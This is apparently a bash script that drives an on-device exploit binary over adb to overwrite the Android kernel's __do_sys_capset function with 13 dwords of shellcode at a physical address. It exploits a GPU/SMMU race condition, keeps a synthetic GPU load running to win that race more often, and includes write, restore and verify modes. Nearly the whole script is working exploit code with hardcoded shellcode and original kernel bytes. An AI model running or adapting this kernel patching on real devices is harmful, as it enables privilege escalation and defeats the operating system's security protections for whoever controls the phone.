#!/usr/bin/env bash
# patch-dwords.sh [write|restore|verify] — manage the __do_sys_capset patch, one dword per process run.
#
# Reliability design (learned the hard way — see ROADMAP §6):
#   * each dword is written by a fresh process, verified by readback, retried with pacing, because
#     losing the TTBR0 race faults the GPU and KGSL throttles a context after 3 faults in 3 s;
#   * on `write`, the ENTRY instruction (dword 0) is written LAST, so the function never executes a
#     half-written body;
#   * if any dword cannot be verified, the whole function is restored immediately (no partial patches);
#   * `verify` compares all 13 dwords against the known original bytes / the shellcode, so the check is
#     meaningful rather than vacuous.
set -u
[ -f "$(dirname "$0")/../device.env" ] && . "$(dirname "$0")/../device.env"
S=${ZF9_SERIAL:?set ZF9_SERIAL (or create device.env)}
BIN=/data/local/tmp/cheese_pa
BASE=0xa8145af0

vals=(0x58000040 0x14000003 0x4b7b0ae0 0xffffffee \
      0x58000041 0x14000003 0x49184c94 0xffffffee \
      0xA9BF7BFD 0xD63F0020 0xA8C17BFD 0x2A1F03E0 0xD65F03C0)
orig=(0xd503233f 0xd10203ff 0xf800865e 0xa9047bfd 0xa9055ff8 0xa90657f6 \
      0xa9074ff4 0x910103fd 0x90010d28 0xf9448908 0xaa0103f4 0x910073e1 0xaa0003f5)

# The SMMU-update race is won far more often while the GPU is actually busy (measured: 11/13 with a
# GPU load running vs 0-2/13 idle). So keep a synthetic GPU load alive for the whole patch.
gpu_load_start() {
    adb -s "$S" shell 'pkill -f screenrecord 2>/dev/null; screenrecord --time-limit 900 /data/local/tmp/gpuload.mp4 >/dev/null 2>&1 &' </dev/null >/dev/null 2>&1
    sleep 2
}
gpu_load_stop() { adb -s "$S" shell 'pkill -f screenrecord' </dev/null >/dev/null 2>&1; }

addr_of() { printf '0x%x' $((BASE + 4 * $1)); }

read_dword() {  # $1 = index
    adb -s "$S" shell "CHEESE_PROBE_ONLY=1 CHEESE_NO_RETRY=1 CHEESE_TARGET_PA=$(addr_of "$1") \
timeout 120 $BIN > /data/local/tmp/pr.txt 2>&1; grep -o 'value=0x[0-9a-f]*' /data/local/tmp/pr.txt | head -1" \
    </dev/null 2>&1 | tr -d '\r' | sed 's/value=//'
}

write_dword() {  # $1 = index, $2 = value -> echoes VERIFIED / FAILED; retries across fresh processes
    local a line
    a=$(addr_of "$1")
    for attempt in 1 2 3 4 5; do
        line=$(adb -s "$S" shell "CHEESE_POKE=1 CHEESE_NO_RETRY=1 CHEESE_TARGET_PA=$a \
CHEESE_WRITE_PA=$a CHEESE_WRITE_VAL=$2 timeout 180 $BIN > /data/local/tmp/pk.txt 2>&1; \
grep -o 'POKE write.*' /data/local/tmp/pk.txt | tail -1" </dev/null 2>&1 | tr -d '\r')
        printf '%s' "$line" | grep -q VERIFIED && { echo VERIFIED; return 0; }
        sleep 2
    done
    echo "FAILED: $line"
    return 1
}

do_write() {  # $1 = mode, rest = 13 values
    local mode=$1; shift
    local -a target=("$@")
    local -a order=(1 2 3 4 5 6 7 8 9 10 11 12 0)   # entry dword last when patching
    [ "$mode" = restore ] && order=(0 1 2 3 4 5 6 7 8 9 10 11 12)
    echo "== $mode ${#target[@]} dwords at $BASE =="
    local ok=0 bad=0 i r
    for i in "${order[@]}"; do
        r=$(write_dword "$i" "${target[$i]}")
        if [ "$r" = VERIFIED ]; then ok=$((ok + 1)); else bad=$((bad + 1)); echo "  !! dword $i FAILED"; fi
    done
    echo "== verified $ok/${#target[@]} (failed: $bad) =="
    if [ "$bad" != 0 ] && [ "$mode" = write ]; then
        echo "== partial patch -> restoring original text =="
        do_write restore "${orig[@]}"
        return 1
    fi
    [ "$bad" = 0 ]
}

do_verify() {
    echo "== verifying kernel text at $BASE =="
    local n_orig=0 n_patch=0 n_other=0 i v
    for i in $(seq 0 12); do
        v=$(read_dword "$i")
        if [ "$v" = "${orig[$i]}" ]; then n_orig=$((n_orig + 1))
        elif [ "$v" = "${vals[$i]}" ]; then n_patch=$((n_patch + 1))
        else n_other=$((n_other + 1)); echo "  dword $i = $v (neither original ${orig[$i]} nor patch ${vals[$i]})"; fi
    done
    echo "  original=$n_orig  patched=$n_patch  other=$n_other"
    if [ "$n_orig" = 13 ]; then echo "  => text is PRISTINE"; return 0; fi
    if [ "$n_patch" = 13 ]; then echo "  => text is FULLY PATCHED"; return 0; fi
    echo "  => text is INCONSISTENT (reboot to restore)"; return 1
}

gpu_load_start                     # all GPU-primitive ops (reads included) race: keep the GPU busy
trap gpu_load_stop EXIT INT TERM

case "${1:-write}" in
    write)   do_write write "${vals[@]}" ;;
    restore) do_write restore "${orig[@]}" ;;
    verify)  do_verify ;;
    *) echo "usage: $0 [write|restore|verify]"; exit 2 ;;
esac
